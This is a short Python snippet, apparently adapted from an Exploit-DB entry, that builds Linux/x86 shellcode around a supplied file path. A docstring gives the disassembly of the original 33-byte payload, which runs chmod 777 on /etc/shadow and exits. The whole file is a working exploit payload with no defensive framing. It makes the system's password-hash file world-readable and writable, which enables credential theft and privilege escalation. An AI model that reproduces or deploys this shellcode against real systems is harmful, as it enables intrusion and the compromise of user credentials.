#https://www.exploit-db.com/exploits/37285/
#WORK


def ch( filee):
	shellcode =  r"\x31\xc0\x50"
	shellcode += filee
	shellcode += r"\xb0\x0f\x89\xe3\x66\xb9\xff\x01\xcd\x80\x31\xc0\x40\xcd\x80"
	return shellcode



"""
Linux/x86 - chmod() 777 /etc/shadow & exit() - 33 bytes

08048060 <.text>:
 8048060:    31 c0                    xor    %eax,%eax
 8048062:    50                       push   %eax
 8048063:    68 61 64 6f 77           push   $0x776f6461
 8048068:    68 63 2f 73 68           push   $0x68732f63
 804806d:    68 2f 2f 65 74           push   $0x74652f2f
 8048072:    b0 0f                    mov    $0xf,%al
 8048074:    89 e3                    mov    %esp,%ebx
 8048076:    66 b9 ff 01              mov    $0x1ff,%cx
 804807a:    cd 80                    int    $0x80
 804807c:    31 c0                    xor    %eax,%eax
 804807e:    40                       inc    %eax
 804807f:    cd 80                    int    $0x80

 """

